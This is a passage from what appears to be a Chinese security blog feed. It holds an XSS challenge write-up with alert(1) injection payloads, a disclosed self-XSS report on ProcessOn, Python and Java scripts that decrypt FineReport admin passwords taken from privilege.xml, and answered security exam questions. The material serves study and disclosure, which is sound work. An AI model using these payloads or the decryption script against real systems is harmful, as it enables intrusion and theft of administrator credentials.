<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// input code</span></span><br><span class="line"><span class="string">");alert(1)("</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// html</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="keyword">var</span> url = <span class="string">'javascript:console.log("\");alert(1)(\"")'</span></span><br><span class="line">  <span class="keyword">var</span> a = <span class="built_in">document</span>.createElement(<span class="string">'a'</span>) <span class="comment">// 创建一个新的元素</span></span><br><span class="line">  a.href = url <span class="comment">//&lt;a&gt; 标签的 href 属性用于指定超链接目标的 URL</span></span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(a) <span class="comment">// 在节点的子节点列表末添加新的子节点</span></span><br><span class="line">  a.click() <span class="comment">//触发点击事件</span></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/haozi_XSS%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20200515101607256.png" alt="image-20200515101607256"></p>
<p>&quot;进行转义后还是”</p>
<p>在 JavaScript 中使用反斜杠来向文本字符串添加特殊字符时都可以使用反斜杠来添加到文本字符串中</p>
<p>可参考：<a href="https://www.w3school.com.cn/js/js_special_characters.asp" target="_blank" rel="noopener">https://www.w3school.com.cn/js/js_special_characters.asp</a></p>
<h5 id="0x12"><a href="#0x12" class="headerlink" title="0x12"></a>0x12</h5><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// server code</span></span><br><span class="line"><span class="comment">// from alf.nu</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">  s = s.replace(<span class="regexp">/"/g</span>, <span class="string">'\\"'</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log("'</span> + s + <span class="string">'");&lt;/script&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// input code</span></span><br><span class="line">&lt;<span class="regexp">/script&gt; &lt;script&gt;alert(1)&lt;/</span>script&gt;<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">// 只过滤一次，内嵌一个script</span></span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// input code</span></span><br><span class="line">\<span class="string">");</span></span><br><span class="line"><span class="string">alert(1);</span></span><br><span class="line"><span class="string">//</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// "</span>被转义成\<span class="string">"经过解析后，变成 console.log("</span>\<span class="string">") 会报语法错误, 再补个 \ 即可</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/haozi_XSS%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20200513182714494.png" alt="image-20200513182714494"></p>
<h4 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h4><p>payload并不唯一，有多种解法，这里不一一叙述，如有错误还请斧正。</p>
<p>haozi开放式答案：<a href="https://github.com/haozi/xss-demo/issues/1" target="_blank" rel="noopener">https://github.com/haozi/xss-demo/issues/1</a></p>
]]></content>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>ProcessOn XSS</title>
    <url>/2020/05/10/ProcessOn%20XSS/</url>
    <content><![CDATA[<p>本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。</p>
<div style="text-align: right"> 小维</div>

<h4 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h4><p>因想跟团队的小伙伴分享一下当时学习XSS是画的流程图，导出时突然弹出了一个框，无意中发现网站存在Self-XSS…</p>
<a id="more"></a>

<p><img src="/img/Processon-XSS/image-20200510102108198.png" alt="image-20200510102108198"></p>
<h4 id="ProcessOn"><a href="#ProcessOn" class="headerlink" title="ProcessOn"></a>ProcessOn</h4><p>ProcessOn 隶属于北京大麦地信息技术有限公司，是一款专业在线作图工具和分享社区。它支持流程图、思维导图、原型图、网络拓扑图和UML等多种类型的绘制。</p>
<h4 id="复盘"><a href="#复盘" class="headerlink" title="复盘"></a>复盘</h4><p>当文本中插入恶意字符，如：<code>&lt;script&gt;alert(&#39;test&#39;)&lt;/script&gt;</code>时，下载文件时会触发js语句从而导致弹框。</p>
<p><img src="/img/Processon-XSS/image-20200510102150613.png" alt="image-20200510102150613"></p>
<p><img src="/img/Processon-XSS/image-20200510102234719.png" alt="image-20200510102234719"></p>
<p>文件标签处（发布需要审核可以盲打~）：</p>
<p><img src="/img/Processon-XSS/image-20200510102520451.png" alt="image-20200510102520451"></p>
<p>这里就不在进一步尝试进行是否可以组合利用扩大影响的测试了，已将相关信息反馈ProcessOn人员。</p>
<p><img src="/img/Processon-XSS/image-20200510105215881.png" alt="image-20200510105215881"></p>
<h4 id="写到最后"><a href="#写到最后" class="headerlink" title="写到最后"></a>写到最后</h4><p>请遵守《网络安全法》等相关法律法规。</p>
]]></content>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>帆软报表（FineReport） privilege.xml管理密码解密</title>
    <url>/2020/04/28/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8%EF%BC%88FineReport%EF%BC%89privilege.xml%E7%AE%A1%E7%90%86%E5%AF%86%E7%A0%81%E8%A7%A3%E5%AF%86/</url>
    <content><![CDATA[<p>本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。</p>
<div style="text-align: right"> 小维</div>

<h4 id="什么是FineReport"><a href="#什么是FineReport" class="headerlink" title="什么是FineReport"></a>什么是FineReport</h4><p>FineReport 是帆软软件有限公司自主研发的一款企业级 web 报表软件产品，它“专业、简捷、灵活”，仅需简单的拖拽操作便可以设计出复杂的中国式报表、参数查询报表、填报表、驾驶舱等，轻松搭建数据决策分析系统。</p>
<a id="more"></a>

<h4 id="报表主要配置文件"><a href="#报表主要配置文件" class="headerlink" title="报表主要配置文件"></a>报表主要配置文件</h4><figure class="highlight lasso"><table><tr><td class="code"><pre><span class="line">config.<span class="built_in">xml</span>文件</span><br><span class="line">保存管理平台和服务器配置中的一些信息</span><br><span class="line"></span><br><span class="line">datasource.<span class="built_in">xml</span>文件</span><br><span class="line">保存的是报表数据连接的一些信息。</span><br><span class="line"></span><br><span class="line">fsconfig.<span class="built_in">xml</span>文件</span><br><span class="line">保存的是op=fs数据决策系统平台属性设置等信息（这是在jar包在<span class="number">20170717</span>之前的老版本里），<span class="number">20170717</span>之后的新版本里，权限信息存储在finedb了。</span><br><span class="line"></span><br><span class="line">functions.<span class="built_in">xml</span>文件</span><br><span class="line">保存的是一些自定义函数的设置。</span><br><span class="line"></span><br><span class="line">privilege.<span class="built_in">xml</span>文件</span><br><span class="line">保存的是管理员账号密码以及管理平台(op=fs)上的权限配置信息（注意，仅仅是保存设置信息，比如是否开启了多级权限及模板权限，不存储具体的权限明细内容）。</span><br><span class="line"></span><br><span class="line">widgets.<span class="built_in">xml</span>文件</span><br><span class="line">保存的是控件管理中定义的预定义控件与自定义控件的信息。</span><br><span class="line"></span><br><span class="line">chartPreStyle.<span class="built_in">xml</span>文件</span><br><span class="line">保存的是图表预定义样式中的信息。</span><br><span class="line"></span><br><span class="line"><span class="built_in">map</span>.<span class="built_in">xml</span>文件</span><br><span class="line">保存的是内置地图和自定义地图的配置信息，包括地图对应的图片，以二进制形式保存在<span class="built_in">map</span>.<span class="built_in">xml</span>中。</span><br><span class="line">注：这个是位图地图的文件</span><br><span class="line"></span><br><span class="line">web.<span class="built_in">xml</span>文件</span><br><span class="line">保存的是Web工程下面的一些信息。</span><br></pre></td></tr></table></figure>

<h4 id="一个小实例"><a href="#一个小实例" class="headerlink" title="一个小实例"></a>一个小实例</h4><h5 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h5><p>任意文件读取</p>
<p><img src="/img/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8%EF%BC%88FineReport%EF%BC%89privilege.xml%E7%AE%A1%E7%90%86%E5%AF%86%E7%A0%81%E8%A7%A3%E5%AF%86/image-20200428145059548.png" alt="image-20200428145059548"></p>
<h5 id="privilege-xml文件"><a href="#privilege-xml文件" class="headerlink" title="privilege.xml文件"></a>privilege.xml文件</h5><p>文件位于\WEB-INF\resources\privilege.xml，该文件保存的是管理员账号密码以及管理平台上的权限配置信息，并使用了硬编码的方式，在Version7.0以上管理密码是进行了加密的，但解密函数已经内置在jar包里了，在这种情况下拿到加密字符串等同于拿到了密码。</p>
<p><img src="/img/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8%EF%BC%88FineReport%EF%BC%89privilege.xml%E7%A1%AC%E7%BC%96%E7%A0%81%E5%AF%86%E7%A0%81%E8%A7%A3%E5%AF%86/image-20200428104018863.png" alt="image-20200428104018863"></p>
<h5 id="JAR包里内置的解密"><a href="#JAR包里内置的解密" class="headerlink" title="JAR包里内置的解密"></a>JAR包里内置的解密</h5><p>代码位于com.fr.stable.CodeUtils中</p>
<p><img src="/img/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8%EF%BC%88FineReport%EF%BC%89privilege.xml%E7%A1%AC%E7%BC%96%E7%A0%81%E5%AF%86%E7%A0%81%E8%A7%A3%E5%AF%86/image-20200428105150473.png" alt="image-20200428105150473"></p>
<h5 id="解密脚本"><a href="#解密脚本" class="headerlink" title="解密脚本"></a>解密脚本</h5><p>根据jar里的内置方法进行编写解密脚本，以下提供python和java两种解密方式：</p>
<p>Python：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Decode</span><span class="params">(Key)</span>:</span></span><br><span class="line">    PassWordArray = [<span class="number">19</span>,<span class="number">78</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">100</span>,<span class="number">213</span>,<span class="number">43</span>,<span class="number">23</span>]</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'密文：'</span>,Key)</span><br><span class="line">    <span class="keyword">if</span> (Key != <span class="literal">None</span> <span class="keyword">and</span> Key.startswith(<span class="string">"___"</span>)):</span><br><span class="line">        Key = Key[<span class="number">3</span>:]</span><br><span class="line">        Text = []</span><br><span class="line">        Step = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,(len(Key) - <span class="number">4</span>) + <span class="number">1</span>,<span class="number">4</span>):</span><br><span class="line">            <span class="keyword">if</span> (Step == len(PassWordArray)):</span><br><span class="line">                Step = <span class="number">0</span></span><br><span class="line">            str = Key[i:i+<span class="number">4</span>]</span><br><span class="line">            num = int(str,<span class="number">16</span>) ^ PassWordArray[Step]</span><br><span class="line">            Text.append(chr(num))</span><br><span class="line">            Step+=<span class="number">1</span></span><br><span class="line">    Text = <span class="string">''</span>.join(Text)</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'解密为：'</span>,Text)</span><br><span class="line"></span><br><span class="line">                </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="comment">#密文：___0072002a00670066000a  &gt;&gt; admin</span></span><br><span class="line">    Decode(<span class="string">'___0072002a00670066000a'</span>)</span><br></pre></td></tr></table></figure>

<p>Java：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">decode</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">final</span> <span class="keyword">int</span>[] PassWordArray = &#123; <span class="number">19</span>, <span class="number">78</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">100</span>, <span class="number">213</span>, <span class="number">43</span>, <span class="number">23</span>&#125;;</span><br><span class="line">        String Key = <span class="string">"___0072002a00670066000a"</span>; <span class="comment">// 密文</span></span><br><span class="line">        <span class="keyword">if</span> (Key != <span class="keyword">null</span> &amp;&amp; Key.startsWith(<span class="string">"___"</span>)) &#123;</span><br><span class="line">            Key = Key.substring(<span class="number">3</span>);</span><br><span class="line">            <span class="keyword">final</span> StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">            <span class="keyword">byte</span> Step = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">byte</span> i = <span class="number">0</span>; i &lt;= Key.length() - <span class="number">4</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (Step == PassWordArray.length) &#123;</span><br><span class="line">                    Step = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">final</span> String str = Key.substring(i, i + <span class="number">4</span>);</span><br><span class="line">                <span class="keyword">final</span> <span class="keyword">int</span> num = Integer.parseInt(str, <span class="number">16</span>) ^ PassWordArray[Step];</span><br><span class="line">                stringBuilder.append((<span class="keyword">char</span>)num);</span><br><span class="line">                Step++;</span><br><span class="line">            &#125;</span><br><span class="line">            Key = stringBuilder.toString();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(Key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h5><p><img src="/img/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8%EF%BC%88FineReport%EF%BC%89privilege.xml%E7%A1%AC%E7%BC%96%E7%A0%81%E5%AF%86%E7%A0%81%E8%A7%A3%E5%AF%86/image-20200428114003117.png" alt="image-20200428114003117"></p>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://help.finereport.com/finereport9.0/doc-view-833.html" target="_blank" rel="noopener">https://help.finereport.com/finereport9.0/doc-view-833.html</a></p>
]]></content>
      <tags>
        <tag>FineReport</tag>
      </tags>
  </entry>
  <entry>
    <title>常见的漏洞修复方案（持续更新...）</title>
    <url>/2020/04/23/%E5%B8%B8%E8%A7%81%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0...%EF%BC%89/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="密码不正确，请重新输入！" data-whm="文章不能被校验, 不过您还是能看看解密后的内容！">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">该文章已受密码保护, 请您输入密码查看。</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="15f26df805f1560a47f344d0305a38e584a205e40da07fff52e85404c66188c8"></script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>漏洞修复</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次SQL注入</title>
    <url>/2020/04/22/%E8%AE%B0%E4%B8%80%E6%AC%A1SQL%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="密码不正确，请重新输入！" data-whm="文章不能被校验, 不过您还是能看看解密后的内容！">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">该文章已受密码保护, 请您输入密码查看。</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="46eb5d141d2c8a238e62e4bb20df552fc056790738abb29e9705c6bc77c15eb1">a4f0bc7be899c0fecea1dd9bd53269b5ab4a6908059156f2cc012a04c842f3e59b0eeb701ecc6bb769d1155fcc257d084fa64353cafe38952b856cc3b16eb34dc5bb365996e0967bacc9f99393a0603a9d2cacc5b25505e08f7f7d49fde09a00f2154d17fc16b811f7a3af3b7068b5f83855cccc612e104a0e2802334003fd136e513c760e93b4c164055394d8015db06d4246414134b21927d82fa05f5280fc135b6b66b372d9759ecca52367afb7bbc50e08388f7ea6f213660c58287612bb44168594812a16f407d69b3d474673901da8a3d33d050bb4f0b59574005ba20f871d4403015d1500dced4160a97dc4083f60263aebf3f8624950aac8c64563d022d365b57fc07d207ddd8ae460c3594f75307e200912d2778a984b2f508f42710ab747f9d7580d5449e3825b2515b4310f4f74508570f8a2f50a728c593a5eb9cac464b281e9e46d500e7bab864437a36964786c883ad846c6c9c3a976df7e3fbea4e0871c68680171f12ea45c9f58e430394cfd57073a696e64f95284990afce204a18e6d6e39763b7b77c317342ae91755c2463215a0cada42032027ead0e3b420067af99e3566367b194284f3cd0464bd37c41af761ca2b79ca9f7e19933718110b3f42eb4f507141c92c3f7b8000f94fc07077974327c4497cbfdb201d002e3653c1d00368a9a70034a121f80f0cba4a34d6cefc93af6f6b03409e5b958a1fecd29a57edfc3f0b3d27194e60e520b54764724711dbb448d3fd1fefe24df4398284d0861d965bff340e5c19c5dbfb503c25b9748bf664cee5531d2a3b7c5920e18e000ed95d1a2c8f2f52dde790e31f9845dead8203cec3924396ce7cce8da565c80829430be745d451c2b5a6ec148cf666baced36aa30a858655c0e8c77e5a4e8f9275fad36f53c94942a2b803fd4693b2844d1d8993161c33286a909b23d5f364e81fcfdf52b04feb904867203d48fe03c41a95d33fd85fd52578f44f46e62594dedbff6e11fa98228908202ec1e98051639e61da82fbe8b9392d788390584831785c47b6f94cade8b33dd27786fb55457c6c2256ce0099312b143da90e6cb6dc1b06e7afa908d20177f94aa10315304330c2b70615fbbaf631bf121fa84dd3d34c8d4323a7cc9604f27974168fb12b6e0e5f8bb211e0ca36f272cae23c11060b91e15051f2b45429c585245b48ccccd5809616743bd63518b34b2e1917b65b76cdffdfd26e1fe8c5be762ab0ff69872fe43d438b108b1b2b28e606135dc1dd13750a5683e53026e21e3c69d45bd6cec9e4d07f739341645ceafa1ff35a5bdcf064aa2c760b4fd66431da62b995937cad5e64da101402f3f46d74fe3fa72b488977d2d9f9a47779aa0260287531474d7a5f699587f9b013a3e80d66be8d31dcfb351e6101c3965034085cfa97bb3456a1a313b65174d72303113f88ac928eae5532120d7b21aa93ac7f8635b08c2bb9d12accda2e976d97296aaf8a6d618542636c85bf5ba201b28fc0c3e3751dede45b5d62a2d6e394fe49932ad70aa2199418d50b5b8ceb3b4c5a6d82c36fb0f274791db7794a8c6c3cd0b61bb02a0d3f1d385157cacc56e0f6af9a987702609e4ec9cba302098bd1e4cc9f7a8923ad471577cfc3395c0c038b7404dd0ecac91b1d0abd0edabd3776259f18f372d9c4edce1355622ca0854d4a09b43870a1bc67caee339d3309efb2c8dadc553f0908886dc2b019b35cc3c2936bd2e13986f43b6453b2218b6aec94fcc3cf0133a8f75b019f062a1808289377be64901c747c9477a7b24c7f6c04d4f4ac24a2a26bd77e945c1ef04107b0db69d1ace208da2b65c3eee000ef363c0a591d05530e74dc8a3d3bda82c26e9bfdd51fa0dabd650a5f046c0b8cb9d44af3298997c508c4dfc0b0ef1e5540ea089c08f00e44af935d66c01179eb199c4f4163d1cdb23015c6c10f1427e736a73e97c23bc6b57204d1e1e4156f23a501983da307feac46915f0cf15124c70c72f8162bb29e15e7765e24ec9657d8843781d728d740c113e3a522165ec69f689fe955708ef212c256ab5cf284e305138b6916cf93ebe93f7e01d488d6cb9eb872bfd639826612ee66423502f2495fa98d67d09feaa5b92f0d5c7fe7b514beea869530078c89d1eed670ded16ed9e7d64f05f616f5681272eb6cd349a8e775db6e2b9ae98bf04d62579720c23d0a36e8174ca65add728a972275b5eab0f0d418789b89c93fd2a36f9adece63fc60e998751772069f1bf71f640776d6fb8873f5696c0ab730d753e202e05777e42812bcc311b2bf2e4a2cae2229033e6add0ca0079d11b8871baa0b876486c84cb20a2299413e663449e286414b1021e89ff6a104b1d663d32c075828b0af5db126ce4b43101d65214076ce7209c53c2a076200fee8140c66a2ce6b336a4e9993ba0dc4491e389c39dd32df808f6a01580b91b9fab6c37a297fb186bf83f472f0ba731ef45e6b4af8ed26c7c07ed202e547be698f4ebb4227c2fcb11fe75d68c61973b620931e00d2ca5687e349fad0a788b201042f8ac7c88ae83e587f306e9833866a952a8d366cbc518c371688fd56bae31d6f779c9aeb4ba2c5dc7c3d2f2cad4ba1beced0acce4e0f4d3e1cf25e45801dcdb6256f0aa1c030b692776e01e2bdc1777346e44ec3f6c262d0b56dd46d7d1b896a01bb11f9d234590608dc0b6dd25661f711984b249cdbd763d11b1f230b5ae2d93eeed81e99676e2edfbf8d0532a210c6fb1ea110170728eed4199cdd1f0cdc1104c1c077cb9e4603753c49fc00f4f2161e9d37cdb5c424a427c326d8954d0398aa9f7f5f50024dc88edb4c886bdb05e57058b0a8c4a2f7ee023a7b16153f414b3d294dc795481df467b563520b1c0f27f4a5ad080922170b29d91d23aaea233a002b3c1b9c995c45e7b65e62fda90aa10a5d4a087884c7827449c60154b06ae0025f7e6d9416090c1b468949cba00fd111f7549c2926b2d2b43730ec51a8d72fd4b0bb21a08c588d24f525da9eb2d2a68f488b0593b9192608c77d69590e48eb1ce96cf52877aa7f7f26072dc7dbed50a718bc0a4fa7c6e9ee0248b89edfd4a9c2bef418c3c721761170f3761da9cd33d636f81862a62b2f2ada582ce9868aeb576ef9587781181c716d5476787bea2d8c64aef1e46db23c94631eb30d5f63c0956a4cae58e3ab808af81a39da5c0b2a919f5987c4716474c2e25419d6bbd6f0b804ec424ac0a5a8bb17dad8669dd2a6b27eda2cd327b08b47d70d9949fb94e91fbc2de5b69751207a766c68e106dfbe7e495059f44ccac1ec4e4d3559b6be1ba03347eea4ba3c2940a4ff140f7885b2611302f82eb1129228f6c6ccb907368a968c1bd985c20528abeb078cb880ed6f02aed4df71cabcaebbbf5c647213a5ce4697dd0b1cc3ccc7c028a8fec522aec9fb745f19785b67d783296a08178c2df6c74a9a9351058a1c7db11dce014caec6aba7f285d4c512c2b4426d6490647b62b2223e48180e1bd4b750324ce058a4258b0f05a79ae737948df8c05b1e83e875ad6d4f9a7cc48d85dcae9fdf002cf6c81f56586c9edf5bd2f91551afd7a33c8cc563cc250acc76ce6a5b239bebbf9645b23ae3cffae4ee32c5bfa5f27d242bb9445845cf2194ed7027ef10a196b519d285c9f33bd38c6f0f9611f4ba702884696808c3d29bdfce0207679ccf07a780a5b609d079e5a13b77fb0de428b431b241808e3f23fa3e74e117fd182aa567c9a82918aa1e0a4435a041b1a17fc4c6c86af7ed58aa4004f9a76946c5f405272aa6faa553e99d511e805afd8173b6583f28aaf055b4412a9c912cc294df95ac17e848c55f68989840f834ac1256c1d8c0c946e634f9ddab9e68d1b7eee1a396c3a9ba81608db0d15ac201e8c38d15514f22cdf56a467835cf5316646e7ec82862caef900975673b472a3f317e0547827199f4904b6888e2a82f121a57f80340cd354501fa0e912d643b8d128139a097b86e846a89be843deaa0c8e4cb2cc1c9bb58f20b6f481af349cb88bcafa4653b2c6437f88ed213984da3e7ebf83c588ed6cae2fc1e4f8afe84af915029f1bf27f00f7b9f45589c995732938e645d946e083cbb5ca8e016c06715bfb3e5adaf94702b5b92dc3553276cfe9b796d1d28cd4c26c8d3a9d2df60ac3f104a9bd2ffea42ca2864d08f6db2eca2957f18d90ffc92d25fdc615d72f518311feb3e61129dbdf227b9756dcfe702ace1cb9281e9adc3e30129ddf4b40d94a6c54b8c7b84e2c986f649c463c4c8932613de22ef8afd2153e677a68ca955c12755d180e27ffce452ac066962c0929bb2614f802b3b03c1e9ad2b2669ce01f02d9c1f3fd4d6f9771fac8934d46509f9ccb07ffffd9a839c1466aca7d4f2b3d7eb32a19207eadd940ae4fbe5171be917993ddd63e996c973a7382ddf17fdcd47e424de41a0909a48f00de15ba1fcdb7132801bc83423f3a736112c363ddf8b23a93c86605678faaca9b21185e3cbe2d39978db02c43889202b42936c9a5ccc2afa19455efe5db0670377465b79104602828b129db18a8e081717fbf3277b8b9f841cdc029a8c1872fa88c6b4a37f4d8e42926c9645f456e3f98e93f77bfee355564ff2493aecaeb15a4baf32583a302389b36c4a0f5dd60bbdd74ae0390de58bfc4ce703ee0884323dad513eaf80e5556a133187a045bee16ec764de9cdc77e509e2e6c7e770e177b333629173d554113e82d3eff246d6de0eb7a628d36d0d7813e36aed4f85696ff48220b5e91e29b9d733d622e6f146923817e9e2dd4767b85ac9f51239ee570c4eef25d1f369a26c14cc4626e9b404c9ac9e9b22bb0d4ea3f1444584c139d514f82b84e0fd20fca1ad39635777a402ae141ef7159c4966329abf7d68b6a489e0e5c879597cacb922aec139ee59a27f4c59cdef47dd19ff097b88</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>SQLi</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次360众测考核</title>
    <url>/2020/04/15/%E8%AE%B0%E4%B8%80%E6%AC%A1360%E4%BC%97%E6%B5%8B%E8%80%83%E6%A0%B8/</url>
    <content><![CDATA[<p>本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。</p>
<div style="text-align: right"> 小维</div>

<h3 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h3><p>以下题目均为本人当时考核时的题目，这里记录一下，答案可能有误仅供参考如有错误还需大家斧正。</p>
<a id="more"></a>

<h4 id="客观题-单选题"><a href="#客观题-单选题" class="headerlink" title="客观题-单选题"></a>客观题-单选题</h4><h5 id="1、密文“6e962e59c2805a6a1c521a13abded480”解密后的明文为：（）"><a href="#1、密文“6e962e59c2805a6a1c521a13abded480”解密后的明文为：（）" class="headerlink" title="1、密文“6e962e59c2805a6a1c521a13abded480”解密后的明文为：（）"></a>1、密文“6e962e59c2805a6a1c521a13abded480”解密后的明文为：（）</h5><ul>
<li><input disabled="" type="checkbox"> A、201806 </li>
<li><input disabled="" type="checkbox"> B、2010622</li>
<li><input checked="" disabled="" type="checkbox"> C、20180623</li>
<li><input disabled="" type="checkbox"> D、20180706</li>
</ul>
<h5 id="2、查看本机端口信息命令是：（）"><a href="#2、查看本机端口信息命令是：（）" class="headerlink" title="2、查看本机端口信息命令是：（）"></a>2、查看本机端口信息命令是：（）</h5><ul>
<li><input checked="" disabled="" type="checkbox"> A、netstat -an</li>
<li><input disabled="" type="checkbox"> B、net share</li>
<li><input disabled="" type="checkbox"> C、net use</li>
<li><input disabled="" type="checkbox"> D、用taskinfo来查看连接情况</li>
</ul>
<h5 id="3、msfvenom生成木马，哪个是必须的参数？：（）"><a href="#3、msfvenom生成木马，哪个是必须的参数？：（）" class="headerlink" title="3、msfvenom生成木马，哪个是必须的参数？：（）"></a>3、msfvenom生成木马，哪个是必须的参数？：（）</h5><ul>
<li><input checked="" disabled="" type="checkbox"> A、-p</li>
<li><input disabled="" type="checkbox"> B、-e</li>
<li><input disabled="" type="checkbox"> C、-o</li>
<li><input disabled="" type="checkbox"> D、-i</li>
</ul>
<h5 id="4、身份鉴别的安全要求中，需要采用双因素认证，以下不属于双因素认证的是？：（）"><a href="#4、身份鉴别的安全要求中，需要采用双因素认证，以下不属于双因素认证的是？：（）" class="headerlink" title="4、身份鉴别的安全要求中，需要采用双因素认证，以下不属于双因素认证的是？：（）"></a>4、身份鉴别的安全要求中，需要采用双因素认证，以下不属于双因素认证的是？：（）</h5><ul>
<li><input disabled="" type="checkbox"> A、登陆服务器需要通过堡垒机</li>
<li><input disabled="" type="checkbox"> B、魔兽世界登录时输入动态密保</li>
<li><input checked="" disabled="" type="checkbox"> C、网页登陆时需要输入图形验证码</li>
<li><input disabled="" type="checkbox"> D、保险柜需要钥匙和指纹都匹配才能解锁</li>
</ul>
<h5 id="5、MSF的模块存放位置是哪个文件夹？：（）"><a href="#5、MSF的模块存放位置是哪个文件夹？：（）" class="headerlink" title="5、MSF的模块存放位置是哪个文件夹？：（）"></a>5、MSF的模块存放位置是哪个文件夹？：（）</h5><ul>
<li><input disabled="" type="checkbox"> A、app</li>
<li><input disabled="" type="checkbox"> B、data</li>
<li><input disabled="" type="checkbox"> C、lib</li>
<li><input checked="" disabled="" type="checkbox"> D、modules</li>
</ul>
<h5 id="6、以串联方式接入企业互联网出口的硬件防火墙，没有以下哪个功能：（）"><a href="#6、以串联方式接入企业互联网出口的硬件防火墙，没有以下哪个功能：（）" class="headerlink" title="6、以串联方式接入企业互联网出口的硬件防火墙，没有以下哪个功能：（）"></a>6、以串联方式接入企业互联网出口的硬件防火墙，没有以下哪个功能：（）</h5><ul>
<li><input disabled="" type="checkbox"> A、对网站前台上传的webshell进行拦截</li>
<li><input checked="" disabled="" type="checkbox"> B、发现企业内网中的SQL注入行为</li>
<li><input disabled="" type="checkbox"> C、阻止黑客对网站后台进行密码爆破</li>
<li><input disabled="" type="checkbox"> D、发现境外势力使用AWVS 对 OA 系统进行扫描</li>
</ul>
<h5 id="7、收集信息而不希望目标发现，应使用哪个工具？：（）"><a href="#7、收集信息而不希望目标发现，应使用哪个工具？：（）" class="headerlink" title="7、收集信息而不希望目标发现，应使用哪个工具？：（）"></a>7、收集信息而不希望目标发现，应使用哪个工具？：（）</h5><ul>
<li><input disabled="" type="checkbox"> A、nmap</li>
<li><input checked="" disabled="" type="checkbox"> B、p0f</li>
<li><input disabled="" type="checkbox"> C、xprobe2</li>
<li><input disabled="" type="checkbox"> D、tcptraceroute</li>
</ul>
